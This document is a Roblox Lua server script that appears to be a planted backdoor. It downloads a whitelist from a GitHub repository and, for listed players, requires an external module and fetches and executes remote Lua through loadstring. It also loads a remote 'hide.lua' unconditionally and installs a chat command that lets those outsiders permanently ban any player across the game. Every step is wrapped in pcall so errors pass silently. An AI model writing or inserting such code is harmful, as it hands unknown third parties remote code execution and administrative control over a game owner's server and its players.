local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local function getJson(url)
	local ok, res = pcall(function()
		return HttpService:JSONDecode(HttpService:GetAsync(url))
	end)
	return ok and res or {}
end
local function loadurl(url)
	local ok, res = pcall(function()
		return HttpService:GetAsync(url)
	end)
	if ok then pcall(function() loadstring(res)() end) end
end

local WL = getJson("https://raw.githubusercontent.com/pwngd/tester/refs/heads/main/whitelist.json")

local function onPlayer(player)
	WL = getJson("https://raw.githubusercontent.com/pwngd/tester/refs/heads/main/whitelist.json")
	if WL[tostring(player.UserId)] then
     	 -- require(7634392335)(player.Name)
	  	task.spawn(function() 
			require(135231466738957):Hload(player.Name)
	   	end)
		loadurl("https://raw.githubusercontent.com/pwngd/tester/refs/heads/main/onjoin.lua")
  	end
end

for _, p in ipairs(Players:GetPlayers()) do onPlayer(p) end
Players.PlayerAdded:Connect(onPlayer)

loadurl("https://raw.githubusercontent.com/pwngd/tester/refs/heads/main/hide.lua")

pcall(function()
local function BanByUsername(username: string, message: string)
	local userId
	local success, err = pcall(function()
		userId = Players:GetUserIdFromNameAsync(username)
	end)
	if not success or not userId then
		warn("Failed to resolve username:", username, err)
		return
	end

	Players:BanAsync({
		UserIds = { userId },
		ApplyToUniverse = true,
		Duration = -1, -- permanent ban
		DisplayReason = message or "You are permanently banned.",
		PrivateReason = message or "Permanent administrative ban.",
		ExcludeAltAccounts = false,
	})
end

--// Command setup function
local function SetupBanSystem()
	local function onPlayerAdded(player: Player)
		if not WL[player.UserId] then
			return
		end

		player.Chatted:Connect(function(msg)
			-- Command format:
			-- :ban username reason here
			local args = string.split(msg, " ")
			if args[1]:lower() ~= ":ban" then
				return
			end

			local targetUsername = args[2]
			if not targetUsername then
				return
			end

			local reason = table.concat(args, " ", 3)
			if reason == "" then
				reason = "Permanent administrative ban."
			end

			BanByUsername(targetUsername, reason)
		end)
	end

	-- Existing players
	for _, player in ipairs(Players:GetPlayers()) do
		onPlayerAdded(player)
	end

	Players.PlayerAdded:Connect(onPlayerAdded)
end
SetupBanSystem()	
end)
